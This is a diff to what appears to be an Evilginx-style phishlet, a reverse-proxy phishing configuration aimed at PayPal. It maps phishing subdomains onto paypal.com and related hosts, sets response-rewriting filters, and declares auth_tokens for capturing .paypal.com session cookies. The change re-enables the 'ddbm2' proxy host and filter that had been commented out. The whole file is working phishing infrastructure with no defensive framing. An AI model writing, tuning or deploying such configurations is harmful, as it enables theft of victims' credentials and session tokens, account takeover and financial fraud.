@@ -8,10 +8,8 @@ proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'paypal.com', session: true, is_landing: true, auto_filters: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'recaptcha.net', session: true, is_landing: false, auto_filters: true}
   - {phish_sub: 'c', orig_sub: 'c', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
-  # 't' is some stuffs for browser i think
   - {phish_sub: 't', orig_sub: 't', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
-  # 'ddbm2' os spome stuffs for interactions 
-  # - {phish_sub: 'ddbm2', orig_sub: 'ddbm2', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
+  - {phish_sub: 'ddbm2', orig_sub: 'ddbm2', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filters: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'paypalobjects.com', session: true, is_landing: false, auto_filters: true}
   - {phish_sub: '', orig_sub: '', domain: 'browser-intake-us5-datadoghq.com', session: true, is_landing: false, auto_filters: true}
@@ -34,7 +32,7 @@ sub_filters:
   - {triggers_on: 'b.stats.paypal.com', orig_sub: 'b.stats', domain: 'paypal.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'api.paypal.com', orig_sub: 'api', domain: 'sprig.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'slc.stats.paypal.com', orig_sub: 'slc.stats', domain: 'paypal.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  # - {triggers_on: 'ddbm2.paypal.com', orig_sub: 'ddbm2', domain: 'ddbm2.paypal.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'ddbm2.paypal.com', orig_sub: 'ddbm2', domain: 'ddbm2.paypal.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 
 auth_tokens:
   - domain: '.paypal.com'
